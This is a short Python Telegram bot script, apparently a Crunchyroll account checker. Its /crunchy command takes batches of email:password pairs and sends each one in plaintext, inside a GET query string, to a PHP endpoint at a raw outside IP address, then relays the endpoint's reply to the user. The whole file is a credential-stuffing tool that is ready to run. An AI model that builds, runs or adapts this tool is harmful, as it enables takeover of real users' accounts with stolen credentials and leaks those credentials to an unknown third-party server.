import telebot
import requests

# Initialize the bot with your token
bot_token = 'YOUR_BOT_TOKEN_HERE'
bot = telebot.TeleBot(bot_token)

# Start command to explain how to use the bot
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Use the /crunchy command followed by email:pass pairs to make requests. For example:\n/crunchy email1:pass1\nemail2:pass2")

# Crunchy command to handle email:pass pairs
@bot.message_handler(commands=['crunchy'])
def handle_crunchy(message):
    # Split the message text to get the email:pass pairs
    email_pass_pairs = message.text[len('/crunchy '):].strip().splitlines()

    for pair in email_pass_pairs:
        try:
            email, password = pair.split(':')
            # Make the request
            url = f"http://31.172.87.218/c.php?e={email}&p={password}"
            response = requests.get(url)
            
            # Send the response back to the user
            bot.reply_to(message, f"Email: {email}\nPassword: {password}\nResponse: {response.text}")
        except ValueError:
            bot.reply_to(message, f"Invalid format for: {pair}. It should be email:password.")
#credits to Zxornatoe
# Start the bot
bot.polling()
